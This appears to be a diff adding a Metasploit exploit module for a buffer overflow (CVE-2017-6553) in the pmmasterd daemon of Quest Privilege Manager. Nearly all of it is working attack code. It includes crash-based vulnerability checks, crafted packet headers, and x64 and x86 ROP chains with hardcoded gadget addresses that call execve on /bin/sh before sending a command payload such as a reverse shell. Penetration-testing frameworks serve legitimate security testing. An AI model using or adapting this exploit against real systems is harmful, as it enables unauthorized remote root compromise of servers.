@@ -1,0 +1,210 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Quest Privilege Manager pmmasterd Buffer Overflow',
+      'Description'    => %q{
+        This modules exploits a buffer overflow in the Quest Privilege Manager,
+        a software used to integrate Active Directory with Linux and Unix
+        systems. The vulnerability exists in the pmmasterd daemon, and can only
+        triggered when the host has been configured as a policy server (
+        Privilege Manager for Unix or Quest Sudo Plugin). A buffer overflow
+        condition exists when handling requests of type ACT_ALERT_EVENT, where
+        the size of a memcpy can be controlled by the attacker. This module
+        only works against version < 6.0.0-27. Versions up to 6.0.0-50 are also
+        vulnerable, but not supported by this module (a stack cookie bypass is
+        required). NOTE: To use this module it is required to be able to bind a
+        privileged port ( <=1024 ) as the server refuses connections coming
+        from unprivileged ports, which in most situations means that root
+        privileges are required.
+      },
+      'Author'         =>
+        [
+          'm0t'
+        ],
+      'References'     =>
+        [
+          ['CVE', '2017-6553'],
+          ['URL', 'https://0xdeadface.wordpress.com/2017/04/07/multiple-vulnerabilities-in-quest-privilege-manager-6-0-0-xx-cve-2017-6553-cve-2017-6554/']
+        ],
+      'Payload'        =>
+        {
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic python perl ruby openssl bash-tcp'
+            }
+        },
+      'Arch'           => ARCH_CMD,
+      'Platform'       => 'unix',
+      'Targets'        =>
+        [
+          ['Quest Privilege Manager pmmasterd 6.0.0-27 x64',
+            {
+              exploit: :exploit_x64,
+              check: :check_x64
+            }
+          ],
+          ['Quest Privilege Manager pmmasterd 6.0.0-27 x86',
+            {
+              exploit: :exploit_x86,
+              check: :check_x86
+            }
+          ]
+        ],
+      'Privileged'     => true,
+      'DisclosureDate' => 'Apr 09 2017',
+      'DefaultTarget'  => 0
+      )
+    )
+
+    register_options(
+      [
+        Opt::RPORT(12345),
+        Opt::CPORT(rand(1024))
+      ]
+    )
+  end
+
+  # definitely not stealthy! sends a crashing request, if the socket dies, or
+  # the output is partial it assumes the target has crashed. Although the
+  # daemon spawns a new process for each connection, the segfault will appear
+  # on syslog
+  def check
+    unless respond_to?(target[:check], true)
+      fail_with(Failure::NoTarget, "Invalid target specified")
+    end
+
+    send(target[:check])
+  end
+
+  def exploit
+    unless respond_to?(target[:exploit], true)
+      fail_with(Failure::NoTarget, "Invalid target specified")
+    end
+
+    request = send(target[:exploit])
+
+    connect
+    print_status("Sending trigger")
+    sock.put(request)
+    sock.get_once
+    print_status("Sending payload")
+    sock.put(payload.encoded)
+    disconnect
+  end
+
+  # server should crash after parsing the packet, partial output is returned
+  def check_x64
+    head = [ 0x26c ].pack("N")
+    head << [ 0x700 ].pack("N")
+    head << [ 0x700 ].pack("N")
+    head << "\x00" * 68
+
+    body = "PingE4.6 .0.0.27"
+    body << rand_text_alpha(3000)
+
+    request = head + body
+
+    connect
+    print_status("Sending trigger")
+    sock.put(request)
+    res = sock.timed_read(1024, 1)
+    if res.match? "Pong4$"
+      return Exploit::CheckCode::Appears
+    else
+      return Exploit::CheckCode::Unknown
+    end
+  end
+
+  # server should crash while parsing the packet, with no output
+  def check_x86
+    head = [ 0x26c ].pack("N")
+    head << [ 0x700 ].pack("N")
+    head << [ 0x700 ].pack("N")
+    head << "\x00" * 68
+
+    body = rand_text_alpha(3000)
+
+    request = head + body
+
+    connect
+    print_status("Sending trigger")
+    sock.put(request)
+    begin
+      sock.timed_read(1024, 1)
+      return Exploit::CheckCode::Unknown
+    rescue ::Exception
+      return Exploit::CheckCode::Appears
+    end
+  end
+
+  def exploit_x64
+    head = [ 0x26c ].pack("N")
+    head << [ 0x700 ].pack("N")
+    head << [ 0x700 ].pack("N")
+    head << "\x00" * 68
+
+    # rop chain for pmmasterd 6.0.0.27 (which is compiled without -fPIE)
+    ropchain = [
+      0x408f88,   # pop rdi, ret
+      0x4FA215,   # /bin/sh
+      0x40a99e,   # pop rsi ; ret
+      0,          # argv  @rsi
+      0x40c1a0,   # pop rax, ret
+      0,          # envp @rax
+      0x48c751,   # mov rdx, rax ; pop rbx ; mov rax, rdx ; ret
+      0xcacc013,  # padding
+      0x408a98,   # execve,
+      0
+    ].pack("Q*")
+
+    body = "PingE4.6 .0.0.27" # this works if encryption is set to AES, which is default, changing E4 to E2 might make it work with DES
+    body << rand_text_alpha(1600)
+    body << ropchain
+    body << rand_text_alpha(0x700 - body.size)
+
+    head + body
+  end
+
+  def exploit_x86
+    head = [ 0x26c ].pack("N")
+    head << [ 0x108 ].pack("N")
+    head << [ 0xcc ].pack("N")
+    head << "\x00" * 68
+
+    # rop chain for pmmasterd 6.0.0.27 (which is compiled without -fPIE)
+    ropchain = [
+      0x8093262,  # ret
+      0x73,       # cs reg
+      0x804AE2C,  # execve,
+      0xcacc013,  # padding
+      0x8136CF0,  # /bin/sh
+      0,
+      0
+    ].pack("V*")
+
+    pivotback = 0x08141223  # sub esp, ebx ; retf
+    writable = 0x81766f8    # writable loc
+
+    body = "PingE4.6 .0.0.27" # this works if encryption is set to AES, which is default, changing E4 to E2 might make it work with DES
+    body << rand_text_alpha(104)
+    body << ropchain
+    body << rand_text_alpha(0xb4 - body.size)
+    body << [0x50].pack("V")
+    body << rand_text_alpha(0xc4 - body.size)
+    body << [pivotback].pack("V")
+    body << [writable].pack("V")
+    body << rand_text_alpha(0x108 - body.size)
+
+    head + body
+  end
+end
